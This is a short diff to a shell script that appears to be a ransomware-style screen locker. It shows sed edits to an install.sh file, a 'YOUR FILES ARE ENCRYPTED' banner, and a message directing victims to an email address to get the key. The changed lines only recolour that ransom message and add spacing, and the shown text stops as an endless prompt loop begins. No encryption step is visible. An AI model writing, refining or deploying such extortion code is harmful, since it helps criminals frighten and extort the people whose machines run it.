@@ -12,7 +12,8 @@ sed -i '9s/echo/#/' install.sh || sed -i '10s/echo/#/' install.sh
 termimage 1705743575411.png
 echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
 echo ""
-echo -e "\033[0;49;92m Talk with the\033[m\033[0;49;93m userpropez8183718@proton.me\033[0;49;92m To get the Encrypt Key!\033[m"
+echo -e "\033[0;49;95m Talk with the\033[m\033[0;49;93m userpropez8183718@proton.me\033[0;49;95m To get the Encrypt Key!\033[m"
+echo ""
 sleep 1
 while :
 do
